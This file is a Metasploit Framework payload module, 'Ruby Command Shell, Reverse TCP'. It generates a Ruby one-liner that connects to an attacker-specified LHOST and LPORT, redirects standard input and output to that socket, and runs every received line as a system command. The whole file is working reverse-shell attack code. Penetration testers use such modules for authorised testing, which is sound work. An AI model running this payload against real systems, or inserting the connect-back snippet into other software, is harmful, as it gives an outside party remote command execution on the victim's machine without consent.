##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 516

  include Msf::Payload::Single
  include Msf::Payload::Ruby
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Ruby Command Shell, Reverse TCP',
        'Description' => 'Connect back and create a command shell via Ruby',
        'Author' => [ 'kris katterjohn', 'hdm' ],
        'License' => MSF_LICENSE,
        'Platform' => 'ruby',
        'Arch' => ARCH_RUBY,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'ruby',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
  end

  def generate(_opts = {})
    return prepends(ruby_string)
  end

  def ruby_string
    lhost = Rex::Socket.is_ipv6?(datastore['LHOST']) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    "require 'socket';c=TCPSocket.new(\"#{lhost}\", #{datastore['LPORT'].to_i});" \
    '$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;' \
    '(IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }'
  end
end
